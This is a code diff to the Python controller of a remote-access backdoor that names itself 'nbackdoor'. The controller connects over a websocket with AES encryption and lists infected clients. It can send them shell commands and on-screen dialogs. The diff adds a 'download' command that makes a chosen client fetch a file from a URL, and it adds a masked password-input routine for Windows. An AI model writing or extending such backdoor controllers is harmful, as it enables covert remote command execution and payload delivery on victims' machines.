@@ -7,7 +7,7 @@ from colorama import Fore, Back, Style
 import uuid
 import json
 import time
-from getpass import getpass
+# from getpass import getpass
 from base64 import b64decode, b64encode
 from websocket import create_connection
 from Crypto.Cipher import AES
@@ -34,7 +34,7 @@ class ControllerClient:
                 self.ws = create_connection(self.SERVER_HOST)
                 print 'Connected!'
 
-                pwd = getpass('Enter the password: ')
+                pwd = pwd_input('Enter the password: ')
 
                 try:
                     sercret_msg = {'uuid': self.UUID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET),
@@ -84,10 +84,10 @@ class ControllerClient:
 
 help            show the command list
 list            list online clients
-job             list all jobs
+jobs            list all jobs
 cmd             send cmd to client
-download
-dialog
+download        download file to client
+dialog          show message to client
 screen
 exit            quit nbackdoor controller
 """
@@ -133,7 +133,19 @@ COMMAND         cmd command to execute
                 return None
 
         elif command_str == 'download':
-            return json.dumps({'cmd': command_str})
+            doc = """Usage: download CLINET_ID URL FILENAME
+
+CLINET_ID       user command "list" to get clinet_id
+COMMAND         cmd command to execute
+-h --help       show this
+"""
+            try:
+                args = docopt(doc, argv=arguments_str, help=True, version=None, options_first=False)
+                return json.dumps({'cmd': command_str, 'to': args['CLINET_ID'],
+                                   'url': args['URL'], 'filename': args['FILENAME']})
+            except SystemExit as e:
+                print e.message
+                return None
 
         elif command_str == 'dialog':
             doc = """Usage: dialog CLINET_ID DIALOG_CONTENT [DIALOG_TITLE]
@@ -190,32 +202,32 @@ def hostname():
         return 'Unknow hostname'
 
 
-# def pwd_input(msg):
-#     print msg,
-#
-#     import msvcrt
-#     chars = []
-#     while True:
-#         try:
-#             new_char = msvcrt.getch().decode(encoding="utf-8")
-#         except:
-#             return input("你很可能不是在 cmd 命令行下运行，密码输入将不能隐藏:")
-#
-#         if new_char in '\r\n':  # 如果是换行，则输入结束
-#             break
-#
-#         elif new_char == '\b':  # 如果是退格，则删除密码末尾一位并且删除一个星号
-#             if chars:
-#                 del chars[-1]
-#                 msvcrt.putch('\b'.encode(encoding='utf-8'))  # 光标回退一格
-#                 msvcrt.putch( ' '.encode(encoding='utf-8'))  # 输出一个空格覆盖原来的星号
-#                 msvcrt.putch('\b'.encode(encoding='utf-8'))  # 光标回退一格准备接受新的输入
-#         else:
-#             chars.append(new_char)
-#             msvcrt.putch('*'.encode(encoding='utf-8'))  # 显示为星号
-#
-#     print
-#     return ''.join(chars)
+def pwd_input(msg):
+    print msg,
+
+    import msvcrt
+    chars = []
+    while True:
+        try:
+            new_char = msvcrt.getch().decode(encoding="utf-8")
+        except:
+            return input("你很可能不是在 cmd 命令行下运行，密码输入将不能隐藏:")
+
+        if new_char in '\r\n':  # 如果是换行，则输入结束
+            break
+
+        elif new_char == '\b':  # 如果是退格，则删除密码末尾一位并且删除一个星号
+            if chars:
+                del chars[-1]
+                msvcrt.putch('\b'.encode(encoding='utf-8'))     # 光标回退一格
+                msvcrt.putch(' '.encode(encoding='utf-8'))      # 输出一个空格覆盖原来的星号
+                msvcrt.putch('\b'.encode(encoding='utf-8'))     # 光标回退一格准备接受新的输入
+        else:
+            chars.append(new_char)
+            msvcrt.putch('*'.encode(encoding='utf-8'))  # 显示为星号
+
+    print
+    return ''.join(chars)
 
 
 def run_controller():
